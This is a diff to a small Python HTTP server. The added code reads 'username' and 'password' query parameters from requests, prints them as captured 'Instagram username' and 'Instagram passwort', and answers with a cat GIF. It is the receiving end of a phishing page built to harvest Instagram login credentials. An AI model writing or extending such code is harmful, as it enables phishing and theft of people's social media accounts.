@@ -13,7 +13,6 @@ def getParam(paramString, paramName):
         currentParamName, currentParamValue = param.split("=")
         if(currentParamName == paramName):
             return currentParamValue
-
     
     return ""
 
@@ -55,11 +54,23 @@ def httpParse(httpRequest, conn):
             
         method, fullPath, version = first_line_parts
 
+        paramString = ""
+
         if(len(fullPath.split("?")) == 2):
             path, paramString = fullPath.split("?")         # /index.html?param1=value1&param2=value2&param3=value3  ---> path: index.html  |  paramString: param1=value1&param2=value2&param3=value3
-            print(getParam(paramString, 'username'))          # Get value of param3
-            print(getParam(paramString, 'password'))          # Get value of param3
-            print(getParam(paramString, '2FA'))          # Get value of param3
+            if (getParam(paramString, 'username') != ""):
+                print("\n_________________________________\n")
+                print(f"Instagram username: {getParam(paramString, 'username')}")          # Get value of the paramter with the name 'username'
+                print(f"Instagram passwort: {getParam(paramString, 'password')}")          # Get value of the paramter with the name 'password'
+                print("\n_________________________________\n")
+
+            with open(f"{root}/cat.gif", "rb") as file:
+
+                fileContent = file.read() 
+                mime_type, _ = mimetypes.guess_type('/cat.gif')
+                    
+                sendHttpResponse(conn, 200, "OK", fileContent, mime_type)
+
 
         else:
             path = fullPath
